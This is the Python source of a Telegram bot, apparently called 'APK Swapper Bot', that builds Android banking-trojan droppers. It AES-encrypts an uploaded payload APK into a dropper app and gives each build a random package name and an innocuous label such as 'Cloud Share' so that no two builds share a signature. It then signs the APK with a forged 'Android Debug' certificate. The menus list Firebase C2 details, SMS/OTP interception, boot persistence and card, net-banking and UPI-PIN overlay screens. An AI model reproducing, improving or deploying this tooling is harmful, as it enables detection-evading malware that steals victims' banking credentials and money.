"""
APK Swapper Bot — Full version with menu + auto-signing
"""

import os, io, zipfile, copy as _copy, secrets, logging, asyncio, hashlib, base64, datetime, struct, zlib
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes
)

# ─── Config ───────────────────────────────────────────────────────────────────

BOT_TOKEN    = os.getenv("BOT_TOKEN", "")
DROPPER_PATH = Path(__file__).parent / "Viral_Leaks_dropper.apk"
KEY_PATH     = Path(__file__).parent / "sign.key"
CERT_PATH    = Path(__file__).parent / "sign.crt"
# Dropper's ORIGINAL embedded key — used only to locate the string in DEX for patching.
# Every rebuild generates a FRESH random key that replaces this in the built APK.
DROPPER_AES_KEY_HEX = "b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1"
AES_KEY_HEX  = DROPPER_AES_KEY_HEX   # kept for UI display; actual encrypt uses per-rebuild key
ASSET_NAME   = "assets/Axyra"

# ── New dropper config (com.base.util.apps) ────────────────────────────────────
# Set NEW_DROPPER_PATH to use the new Java dropper instead of Viral_Leaks.
# The new dropper stores its key as base64(key XOR 0x55), always 44 chars.
# Same package suffix scheme: OLD_PKG_NEW = 'com.base.util.apps' (18 chars)
NEW_DROPPER_PATH  = Path(__file__).parent / "dropper_release.apk"   # built from samples/dropper
NEW_DROPPER_B64_KEY = "t/ytp2yZiA+H4w5+GyCFzyMUazlYAdAfZA/C4kATG38="  # template key placeholder
NEW_ASSET_NAME    = "assets/core.dat"
OLD_PKG_NEW       = "com.base.util.apps"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
log = logging.getLogger(__name__)

# ─── Pure-Python APK v1 signing (no Java needed) ─────────────────────────────

def _load_or_create_key_cert():
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID
    except ImportError:
        return None, None

    if KEY_PATH.exists() and CERT_PATH.exists():
        key  = serialization.load_pem_private_key(KEY_PATH.read_bytes(), password=None)
        cert = x509.load_pem_x509_certificate(CERT_PATH.read_bytes())
        return key, cert

    log.info("Signing key generate kar raha hoon...")
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    KEY_PATH.write_bytes(key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    ))
    name = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME,         "Android Debug"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME,   "Android"),
        x509.NameAttribute(NameOID.COUNTRY_NAME,        "US"),
    ])
    now  = datetime.datetime.utcnow()
    cert = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=10000))
        .sign(key, hashes.SHA256())
    )
    CERT_PATH.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    log.info("Key + cert saved.")
    return key, cert


def _b64(b: bytes) -> str:
    return base64.b64encode(b).decode()


def _build_manifest(entries: list[tuple[str, bytes]]) -> bytes:
    lines = ["Manifest-Version: 1.0\r\nCreated-By: 1.0 (Python)\r\n\r\n"]
    for name, data in entries:
        digest = _b64(hashlib.sha256(data).digest())
        lines.append(f"Name: {name}\r\nSHA-256-Digest: {digest}\r\n\r\n")
    return "".join(lines).encode()


def _build_sf(manifest: bytes, sections: list[tuple[str, bytes]]) -> bytes:
    mf_digest = _b64(hashlib.sha256(manifest).digest())
    lines = [
        f"Signature-Version: 1.0\r\n"
        f"Created-By: 1.0 (Python)\r\n"
        f"SHA-256-Digest-Manifest: {mf_digest}\r\n\r\n"
    ]
    for name, sect_bytes in sections:
        digest = _b64(hashlib.sha256(sect_bytes).digest())
        lines.append(f"Name: {name}\r\nSHA-256-Digest: {digest}\r\n\r\n")
    return "".join(lines).encode()


def _lp(data: bytes) -> bytes:
    """uint32-LE length prefix + data (APK v2 block encoding)."""
    return struct.pack('<I', len(data)) + data


def _add_v2_signature(apk_bytes: bytes, key, cert) -> bytes:
    """Insert APK Signature Scheme v2 signing block between file data and CD."""
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding as rsa_pad

    EOCD_SIG   = 0x06054b50
    MAGIC      = b"APK Sig Block 42"
    ALGO_ID    = 0x0103          # RSASSA-PKCS1-v1_5 + SHA-256
    CHUNK_SIZE = 1 << 20         # 1 MiB

    n = len(apk_bytes)
    eocd_off = -1
    for i in range(n - 22, max(n - 22 - 65536, -1), -1):
        if struct.unpack_from('<I', apk_bytes, i)[0] == EOCD_SIG:
            eocd_off = i
            break
    if eocd_off < 0:
        return apk_bytes

    cd_offset = struct.unpack_from('<I', apk_bytes, eocd_off + 16)[0]

    part1 = apk_bytes[:cd_offset]
    part2 = apk_bytes[cd_offset:eocd_off]
    part3 = apk_bytes[eocd_off:]

    def _chunk_digests(data: bytes) -> list[bytes]:
        out = []
        if not data:
            out.append(hashlib.sha256(b'\xa5' + struct.pack('<I', 0)).digest())
        else:
            pos = 0
            while pos < len(data):
                chunk = data[pos:pos + CHUNK_SIZE]
                pos += CHUNK_SIZE
                out.append(hashlib.sha256(b'\xa5' + struct.pack('<I', len(chunk)) + chunk).digest())
        return out

    all_cd = _chunk_digests(part1) + _chunk_digests(part2) + _chunk_digests(part3)
    top_digest = hashlib.sha256(
        b'\x5a' + struct.pack('<I', len(all_cd)) + b''.join(all_cd)
    ).digest()

    cert_der    = cert.public_bytes(serialization.Encoding.DER)
    pub_der     = key.public_key().public_bytes(
        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
    )

    digest_item_data = struct.pack('<I', ALGO_ID) + _lp(top_digest)
    digests_list     = _lp(_lp(digest_item_data))

    certs_list = _lp(_lp(cert_der))
    attrs_list = _lp(b'')

    signed_data = digests_list + certs_list + attrs_list

    raw_sig = key.sign(signed_data, rsa_pad.PKCS1v15(), hashes.SHA256())

    sig_item_data   = struct.pack('<I', ALGO_ID) + _lp(raw_sig)
    signatures_list = _lp(_lp(sig_item_data))

    signer  = _lp(signed_data) + signatures_list + _lp(pub_der)
    signers = _lp(_lp(signer))

    pair        = struct.pack('<Q', len(signers) + 4) + struct.pack('<I', 0x7109871a) + signers
    block_size  = len(pair) + 8 + 16
    sig_block   = struct.pack('<Q', block_size) + pair + struct.pack('<Q', block_size) + MAGIC

    new_cd_off  = cd_offset + len(sig_block)
    eocd_patched = bytearray(apk_bytes[eocd_off:])
    struct.pack_into('<I', eocd_patched, 16, new_cd_off)

    return part1 + sig_block + part2 + bytes(eocd_patched)


def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.serialization import pkcs7
    except ImportError:
        log.warning("cryptography lib nahi — pip install cryptography karo")
        return apk_bytes, False

    key, cert = _load_or_create_key_cert()
    if key is None:
        return apk_bytes, False

    zin = zipfile.ZipFile(io.BytesIO(apk_bytes))
    entries = []
    for item in zin.infolist():
        if item.filename.startswith("META-INF/"):
            continue
        entries.append((item.filename, zin.read(item.filename)))
    zin.close()

    manifest = _build_manifest(entries)

    sf_sections = []
    for name, data in entries:
        digest = _b64(hashlib.sha256(data).digest())
        sect = f"Name: {name}\r\nSHA-256-Digest: {digest}\r\n\r\n".encode()
        sf_sections.append((name, sect))
    cert_sf = _build_sf(manifest, sf_sections)

    cert_rsa = (
        pkcs7.PKCS7SignatureBuilder()
        .set_data(cert_sf)
        .add_signer(cert, key, hashes.SHA256())
        .sign(serialization.Encoding.DER, [])
    )

    out = io.BytesIO(apk_bytes)
    with zipfile.ZipFile(out, "a") as zout:
        for mname, mdata in [
            ("META-INF/MANIFEST.MF", manifest),
            ("META-INF/CERT.SF",     cert_sf),
            ("META-INF/CERT.RSA",    cert_rsa),
        ]:
            info = zipfile.ZipInfo(mname)
            info.compress_type = zipfile.ZIP_STORED
            zout.writestr(info, mdata)

    apk_v1 = out.getvalue()
    log.info("APK signed (v1/JAR, appended META-INF)")

    try:
        apk_v1v2 = _add_v2_signature(apk_v1, key, cert)
        log.info("APK v2 signing block added (%d bytes)", len(apk_v1v2) - len(apk_v1))
        return apk_v1v2, True
    except Exception as e:
        log.warning("v2 signing failed (%s) — returning v1-only", e)
        return apk_v1, True

# ─── State ────────────────────────────────────────────────────────────────────

# user_id → True means waiting for APK upload
awaiting_apk: set[int] = set()

# ─── Crypto ───────────────────────────────────────────────────────────────────

import string as _string
import random as _random

def _encrypt_payload(data: bytes, key: bytes) -> bytes:
    iv = secrets.token_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, AES.block_size))

OLD_PKG = "com.gdww.ihwc.hpfv"
_ALPHA  = _string.ascii_lowercase
_ALNUM  = _string.ascii_lowercase + _string.digits

def _random_pkg() -> str:
    # First char must be letter — Android rejects package components starting with digit
    suffix = _random.choice(_ALPHA) + ''.join(_random.choices(_ALNUM, k=3))
    return f"com.gdww.ihwc.{suffix}"

def _patch_pkg(data: bytes, new_pkg: str) -> bytes:
    """Selective UTF-16LE patch of OLD_PKG in binary AXML / resources.arsc.

    After matching com.gdww.ihwc.hpfv:
      not followed by '.'           -> standalone package attr     -> PATCH
      followed by '.' + lowercase   -> ContentProvider authority   -> PATCH
      followed by '.' + uppercase   -> Java class name / constant  -> SKIP

    Class names preserved so DEX descriptors still resolve.
    Provider authorities patched so Android won't reject with
    INSTALL_FAILED_CONFLICTING_PROVIDER if original app is installed.
    """
    assert len(new_pkg) == len(OLD_PKG)
    old     = OLD_PKG.encode('utf-16-le')
    new     = new_pkg.encode('utf-16-le')
    dot_u16 = b'\x2e\x00'
    result  = bytearray(data)
    pos     = 0
    while True:
        idx = result.find(old, pos)
        if idx == -1:
            break
        end   = idx + len(old)
        after = bytes(result[end:end + 2])
        if after != dot_u16:
            # Standalone package name
            result[idx:end] = new
            pos = idx + len(new)
        else:
            # Dot follows — check first char of suffix (UTF-16LE: char at end+2, pad at end+3)
            suffix_char = result[end + 2] if end + 2 < len(result) else 0
            if 0x61 <= suffix_char <= 0x7a:  # a-z lowercase
                # ContentProvider authority, permission name, etc. -> PATCH
                result[idx:end] = new
                pos = idx + len(new)
            else:
                # Java class name / broadcast constant (uppercase/digit) -> SKIP
                pos = end
    return bytes(result)

# App label randomization — replace "Viral Leaks" in AXML UTF-16LE string pool.
# All candidates are exactly 11 chars (same as "Viral Leaks") so the
# uint16_LE length prefix 0x0b00 stays unchanged → pure in-place swap.
_VIRAL_LEAKS_U16  = b'\x0b\x00' + 'Viral Leaks'.encode('utf-16-le')
_APP_LABELS_U16   = [
    b'\x0b\x00' + lbl.encode('utf-16-le')
    for lbl in [
        "Cloud Share", "Media Vault", "Quick Share",
        "Flash Store", "Sync Helper", "File Upload",
        "Safe Backup", "Link Bridge", "Dark Tunnel",
        "Photo Syncs",
    ]
]

def _randomize_app_label(data: bytes) -> bytes:
    """Replace 'Viral Leaks' with a random 11-char name in AXML string pool."""
    result = bytearray(data)
    idx = result.find(_VIRAL_LEAKS_U16)
    if idx == -1:
        log.warning("App label 'Viral Leaks' not found in AXML")
        return data
    replacement = _random.choice(_APP_LABELS_U16)
    result[idx:idx + len(_VIRAL_LEAKS_U16)] = replacement
    label_text = replacement[2:].decode('utf-16-le', errors='replace')
    log.info("Randomized app label → '%s'", label_text)
    return bytes(result)

_TARGET_PKG_NEEDLE = bytes([0x12, 0x12]) + b'com.btmo.awws.hoag'

def _blank_target_pkg_arsc(data: bytes) -> bytes:
    """Zero UTF-8 length prefix of target_package_name string in resources.arsc.

    The global UTF-8 string pool stores R.string.target_package_name as
    'com.btmo.awws.hoag'. When the 2-byte length prefix is zeroed, getString()
    returns "" -> readTargetPackageFromStrings returns early without setting
    actualTargetPackageName -> setupHomeUi takes the installer UI path instead
    of crashing with NameNotFoundException on a device without that package.
    """
    result = bytearray(data)
    idx = result.find(_TARGET_PKG_NEEDLE)
    if idx == -1:
        log.warning("target_package_name string not found in resources.arsc — crash may still occur")
        return data
    result[idx]     = 0  # UTF-16 char count
    result[idx + 1] = 0  # UTF-8 byte count
    log.info("Blanked target_package_name in arsc @offset %d", idx)
    return bytes(result)


def _patch_dex(dex: bytes, new_pkg: str) -> bytes:
    """Patch UTF-8 authority strings in classes.dex and recompute header.

    DEX string pool is MUTF-8. Old and new pkg are same byte length (hpfv→xxxx
    both 4 chars, all ASCII), so ULEB128 length fields are unchanged.
    Logic mirrors _patch_pkg:
      standalone (no '.')             -> package authority string -> PATCH
      followed by '.' + lowercase     -> provider / startup authority -> PATCH
      followed by '.' + uppercase     -> class descriptor / constant -> SKIP
    After patching: recompute SHA-1 (dex[32:]) and Adler32 (dex[12:]).
    """
    assert len(new_pkg) == len(OLD_PKG), "pkg length must match for in-place patch"
    old_u8 = OLD_PKG.encode()   # UTF-8 / ASCII
    new_u8 = new_pkg.encode()
    result = bytearray(dex)
    pos = 0
    while True:
        idx = result.find(old_u8, pos)
        if idx == -1:
            break
        end  = idx + len(old_u8)
        after = result[end] if end < len(result) else 0
        if after != 0x2e:           # not '.'
            result[idx:end] = new_u8
            pos = idx + len(new_u8)
        else:
            sc = result[end + 1] if end + 1 < len(result) else 0
            if 0x61 <= sc <= 0x7a:  # lowercase -> authority -> patch
                result[idx:end] = new_u8
                pos = idx + len(new_u8)
            else:                   # uppercase/digit -> class descriptor -> skip
                pos = end
    # Recompute DEX SHA-1 (covers bytes[32:]) and Adler32 (covers bytes[12:])
    result[12:32] = hashlib.sha1(bytes(result[32:])).digest()
    struct.pack_into('<I', result, 8, zlib.adler32(bytes(result[12:])) & 0xFFFFFFFF)
    return bytes(result)


def _patch_dex_aes_key(dex: bytes, new_key_hex: str) -> bytes:
    """Replace the 64-char AES key hex string in DEX with a new one.

    The old key is exactly 64 ASCII chars in the DEX string pool.  New key is
    also 64 chars so ULEB128 length prefix is unchanged — direct byte replace.
    Recomputes DEX SHA-1 + Adler32 after patching.
    """
    old_bytes = DROPPER_AES_KEY_HEX.encode('ascii')
    new_bytes = new_key_hex.encode('ascii')
    assert len(old_bytes) == len(new_bytes) == 64
    result = bytearray(dex)
    idx = result.find(old_bytes)
    if idx == -1:
        log.warning("AES key hex not found in DEX — payload key NOT patched!")
        return dex
    result[idx:idx + 64] = new_bytes
    result[12:32] = hashlib.sha1(bytes(result[32:])).digest()
    struct.pack_into('<I', result, 8, zlib.adler32(bytes(result[12:])) & 0xFFFFFFFF)
    log.info("Patched DEX AES key @%d: %s...", idx, new_key_hex[:16])
    return bytes(result)


def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
    """Returns (apk_bytes, pkg_name).

    Generates a fresh random AES-256 key for every rebuild:
      - DEX hex string is replaced with the new key
      - Payload is encrypted with the new key
    Each output APK has a unique key + unique ciphertext → no shared signature.
    """
    new_aes_key     = secrets.token_bytes(32)
    new_aes_key_hex = new_aes_key.hex()
    encrypted       = _encrypt_payload(payload_bytes, new_aes_key)
    new_pkg         = _random_pkg()
    buf = io.BytesIO()
    with zipfile.ZipFile(DROPPER_PATH, "r") as zin, \
         zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zout:
        for item in zin.infolist():
            if item.filename.startswith("META-INF/"):
                continue
            data = zin.read(item)
            if item.filename == ASSET_NAME:
                data = encrypted
            elif item.filename == "AndroidManifest.xml":
                data = _patch_pkg(data, new_pkg)
                data = _randomize_app_label(data)
            elif item.filename == "resources.arsc":
                data = _patch_pkg(data, new_pkg)
                data = _blank_target_pkg_arsc(data)
            elif item.filename == "classes.dex":
                data = _patch_dex(data, new_pkg)
                data = _patch_dex_aes_key(data, new_aes_key_hex)

            # 4-byte alignment for STORED entries (zipalign — required by Android)
            if item.compress_type == zipfile.ZIP_STORED:
                item = _copy.copy(item)
                fn_enc = item.filename.encode(
                    'utf-8' if (item.flag_bits & 0x800) else 'cp437'
                )
                padding = (-(buf.tell() + 30 + len(fn_enc))) % 4
                item.extra = b'\x00' * padding

            zout.writestr(item, data)
    log.info("Rebuilt dropper pkg=%s key=%s...", new_pkg, new_aes_key_hex[:16])
    return buf.getvalue(), new_pkg


def _patch_dex_b64_key(dex: bytes, new_key_hex: str) -> bytes:
    """Patch base64(key XOR 0x55) in new dropper's DEX.

    New dropper stores the key as base64(key XOR 0x55) — always 44 chars.
    Bot finds the current template b64 string and replaces with new one.
    Same length → ULEB128 prefix unchanged.  Recomputes DEX checksums.
    """
    new_key  = bytes.fromhex(new_key_hex)
    xored    = bytes(b ^ 0x55 for b in new_key)
    new_b64  = base64.b64encode(xored).decode('ascii')  # always 44 chars
    old_b64  = NEW_DROPPER_B64_KEY
    assert len(old_b64) == len(new_b64) == 44, "b64 key length mismatch"
    old_bytes = old_b64.encode('ascii')
    new_bytes = new_b64.encode('ascii')
    result    = bytearray(dex)
    idx       = result.find(old_bytes)
    if idx == -1:
        log.warning("b64 key string not found in new dropper DEX — key NOT patched!")
        return dex
    result[idx:idx + 44] = new_bytes
    result[12:32] = hashlib.sha1(bytes(result[32:])).digest()
    struct.pack_into('<I', result, 8, zlib.adler32(bytes(result[12:])) & 0xFFFFFFFF)
    log.info("Patched new dropper DEX b64 key @%d", idx)
    return bytes(result)


def rebuild_new_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
    """Rebuild the new Java dropper (dropper_release.apk).

    Same pipeline as rebuild_dropper but:
      - Package base is OLD_PKG_NEW = 'com.base.util.apps'
      - Asset is assets/core.dat
      - Key is stored as base64(key XOR 0x55) in DEX → patched by _patch_dex_b64_key
    """
    if not NEW_DROPPER_PATH.exists():
        raise FileNotFoundError(f"New dropper not found: {NEW_DROPPER_PATH}")

    new_aes_key     = secrets.token_bytes(32)
    new_aes_key_hex = new_aes_key.hex()
    encrypted       = _encrypt_payload(payload_bytes, new_aes_key)
    # New dropper package randomization — suffix is last 4 chars of OLD_PKG_NEW ('apps')
    import string as _s, random as _r
    _al = _s.ascii_lowercase; _an = _s.ascii_lowercase + _s.digits
    new_suffix = _r.choice(_al) + ''.join(_r.choices(_an, k=3))
    new_pkg    = f"com.base.util.{new_suffix}"
    old_pkg    = OLD_PKG_NEW

    buf = io.BytesIO()
    with zipfile.ZipFile(NEW_DROPPER_PATH, "r") as zin, \
         zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zout:
        for item in zin.infolist():
            if item.filename.startswith("META-INF/"):
                continue
            data = zin.read(item)
            if item.filename == NEW_ASSET_NAME:
                data = encrypted
            elif item.filename == "AndroidManifest.xml":
                data = _patch_pkg_generic(data, old_pkg, new_pkg)
            elif item.filename == "resources.arsc":
                data = _patch_pkg_generic(data, old_pkg, new_pkg)
            elif item.filename == "classes.dex":
                data = _patch_dex_b64_key(data, new_aes_key_hex)

            if item.compress_type == zipfile.ZIP_STORED:
                item = _copy.copy(item)
                fn_enc = item.filename.encode(
                    'utf-8' if (item.flag_bits & 0x800) else 'cp437'
                )
                padding = (-(buf.tell() + 30 + len(fn_enc))) % 4
                item.extra = b'\x00' * padding
            zout.writestr(item, data)

    log.info("Rebuilt new dropper pkg=%s key=%s...", new_pkg, new_aes_key_hex[:16])
    return buf.getvalue(), new_pkg


def _patch_pkg_generic(data: bytes, old_pkg: str, new_pkg: str) -> bytes:
    """UTF-16LE patch of an arbitrary equal-length package name in AXML/arsc."""
    assert len(old_pkg) == len(new_pkg)
    old     = old_pkg.encode('utf-16-le')
    new     = new_pkg.encode('utf-16-le')
    dot_u16 = b'\x2e\x00'
    result  = bytearray(data)
    pos     = 0
    while True:
        idx = result.find(old, pos)
        if idx == -1:
            break
        end  = idx + len(old)
        after = bytes(result[end:end + 2])
        if after != dot_u16:
            result[idx:end] = new
            pos = idx + len(new)
        else:
            sc = result[end + 2] if end + 2 < len(result) else 0
            if 0x61 <= sc <= 0x7a:
                result[idx:end] = new
                pos = idx + len(new)
            else:
                pos = end
    return bytes(result)


# ─── Keyboards ────────────────────────────────────────────────────────────────

def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤  APK Upload karo", callback_data="upload")],
        [InlineKeyboardButton("🔑  AES Key dekho",   callback_data="key"),
         InlineKeyboardButton("ℹ️  Bot Info",        callback_data="info")],
        [InlineKeyboardButton("📋  Permissions list", callback_data="perms")],
    ])

# ─── Handlers ─────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    awaiting_apk.discard(user.id)
    await update.message.reply_text(
        f"👋 Welcome, {user.first_name}!\n\n"
        "🔧 *APK Swapper Bot*\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Naya payload APK upload karo — main usse encrypt karke\n"
        "dropper ke andar Axyra replace kar dunga.\n\n"
        "📦 *Dropper:* `com.gdww.ihwc.hpfv`\n"
        "🔐 *Algo:* AES-256-CBC (IV prepended)\n"
        "📁 *Asset:* `assets/Axyra`\n\n"
        "Neeche menu se option chuno 👇",
        parse_mode="Markdown",
        reply_markup=main_menu_kb()
    )

async def cmd_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    awaiting_apk.discard(update.effective_user.id)
    await update.message.reply_text(
        "🏠 *Main Menu*\nOption chuno:",
        parse_mode="Markdown",
        reply_markup=main_menu_kb()
    )

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data

    if data == "upload":
        awaiting_apk.add(uid)
        await q.message.reply_text(
            "📤 *APK Upload Mode*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "Ab apna naya payload `.apk` file bhejo.\n\n"
            "⚙️ Main kya karunga:\n"
            "  1️⃣  File validate karunga (ZIP magic check)\n"
            "  2️⃣  AES-256-CBC se encrypt karunga\n"
            "  3️⃣  Random IV prepend karunga\n"
            "  4️⃣  Dropper ki `assets/Axyra` replace karunga\n"
            "  5️⃣  Naya dropper wapas bheejunga\n\n"
            "⚠️ *Note:* Install ke liye re-sign karna hoga.\n"
            "Cancel karne ke liye /menu",
            parse_mode="Markdown"
        )

    elif data == "key":
        await q.message.reply_text(
            "🔑 *Encryption Details*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"*Algorithm:* `AES/CBC/PKCS5Padding`\n"
            f"*Key (256-bit):*\n`{AES_KEY_HEX}`\n\n"
            f"*IV:* Random 16 bytes, ciphertext ke pehle prepend hota hai\n"
            f"*Source:* Dropper DEX mein `AES_KEY_HEX` constant\n"
            f"*Asset:* `assets/Axyra`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="home")
            ]])
        )

    elif data == "info":
        dropper_size = DROPPER_PATH.stat().st_size // 1024 if DROPPER_PATH.exists() else 0
        status = "✅ Loaded" if DROPPER_PATH.exists() else "❌ Missing"
        await q.message.reply_text(
            "ℹ️ *Bot Info*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"*Dropper file:* {status}\n"
            f"*Dropper size:* {dropper_size} KB\n"
            f"*Dropper pkg:* `com.gdww.ihwc.hpfv`\n"
            f"*Payload pkg:* `com.btmo.awws.hoag`\n\n"
            "*C2 Infrastructure:*\n"
            "  • Firebase: `toxicgen-f1d0c`\n"
            "  • RTDB: `toxicgen-f1d0c-default-rtdb`\n"
            "  • FCM Sender: `1086425822943`\n\n"
            "*Dropper Flow:*\n"
            "  Viral Leaks → Axyra decrypt → Install payload\n"
            "  → VpnBypassService → PackageInstaller",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="home")
            ]])
        )

    elif data == "perms":
        await q.message.reply_text(
            "📋 *Payload Permissions*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "🔴 *Dangerous:*\n"
            "  • `READ_SMS` — OTP padho\n"
            "  • `RECEIVE_SMS` — SMS aane pe intercept\n"
            "  • `SEND_SMS` — SMS bhejo\n"
            "  • `CALL_PHONE` — Call karo\n"
            "  • `READ_PHONE_STATE` — Device info\n"
            "  • `READ_PHONE_NUMBERS` — Number padho\n\n"
            "🟡 *System:*\n"
            "  • `RECEIVE_BOOT_COMPLETED` — Boot persistence\n"
            "  • `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`\n"
            "  • `FOREGROUND_SERVICE`\n"
            "  • `POST_NOTIFICATIONS`\n\n"
            "🟢 *Network:*\n"
            "  • `INTERNET`\n"
            "  • `ACCESS_NETWORK_STATE`\n\n"
            "*Overlay Screens:*\n"
            "  💳 CreditCardActivity\n"
            "  🏦 NetBankingActivity\n"
            "  📱 UpiPinActivity",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="home")
            ]])
        )

    elif data == "home":
        awaiting_apk.discard(uid)
        await q.message.reply_text(
            "🏠 *Main Menu*",
            parse_mode="Markdown",
            reply_markup=main_menu_kb()
        )

async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    doc = update.message.document

    if uid not in awaiting_apk:
        await update.message.reply_text(
            "Pehle menu se *📤 APK Upload karo* dabao.",
            parse_mode="Markdown",
            reply_markup=main_menu_kb()
        )
        return

    if not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text("❌ Sirf `.apk` files.\nDobara bhejo ya /menu")
        return

    if not DROPPER_PATH.exists():
        await update.message.reply_text("❌ Dropper file missing: `Viral_Leaks_dropper.apk`", parse_mode="Markdown")
        return

    awaiting_apk.discard(uid)

    prog = await update.message.reply_text(
        f"⬇️ Download ho raha hai: `{doc.file_name}` ({doc.file_size // 1024} KB)...",
        parse_mode="Markdown"
    )

    tg_file = await ctx.bot.get_file(doc.file_id)
    apk_bytes = bytes(await tg_file.download_as_bytearray())

    if apk_bytes[:2] != b"PK":
        await prog.edit_text("❌ Invalid APK — ZIP magic nahi mila. Sahi file bhejo.\n/menu")
        return

    await prog.edit_text("🔐 Encrypt ho raha hai + Axyra replace...")

    try:
        new_dropper, new_pkg = rebuild_new_dropper(apk_bytes)
    except Exception as e:
        log.exception("rebuild failed")
        await prog.edit_text(f"❌ Error: {e}")
        return

    await prog.edit_text("✍️ Sign ho raha hai...")
    try:
        new_dropper, signed = sign_apk(new_dropper)
    except Exception as e:
        log.exception("signing failed")
        await prog.edit_text(f"⚠️ Sign nahi hua: {e}\nUnsigned dropper bhej raha hoon...")
        signed = False

    sign_note = "✅ v1+v2 (debug key)" if signed else "⚠️ Unsigned"
    out_name = f"dropper_{doc.file_name}"
    await prog.edit_text(f"📤 Bhej raha hoon ({len(new_dropper) // 1024} KB)...")

    await update.message.reply_document(
        document=io.BytesIO(new_dropper),
        filename=out_name,
        caption=(
            f"✅ *Dropper ready!*\n\n"
            f"📦 Payload: `{doc.file_name}`\n"
            f"📏 Size: `{len(new_dropper) // 1024} KB`\n"
            f"📦 Package: `{new_pkg}`\n"
            f"🔐 Key: `{AES_KEY_HEX[:24]}...`\n"
            f"✍️ Signature: {sign_note}"
        ),
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Aur ek APK", callback_data="upload"),
            InlineKeyboardButton("🏠 Menu",        callback_data="home"),
        ]])
    )
    await prog.delete()
    log.info("Sent rebuilt dropper %s (%d bytes) to uid=%d", out_name, len(new_dropper), uid)

# ─── Main ─────────────────────────────────────────────────────────────────────

async def post_init(app):
    await app.bot.set_my_commands([
        BotCommand("start", "Welcome screen"),
        BotCommand("menu",  "Main menu"),
    ])

def main():
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu",  cmd_menu))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    log.info("Bot polling shuru...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
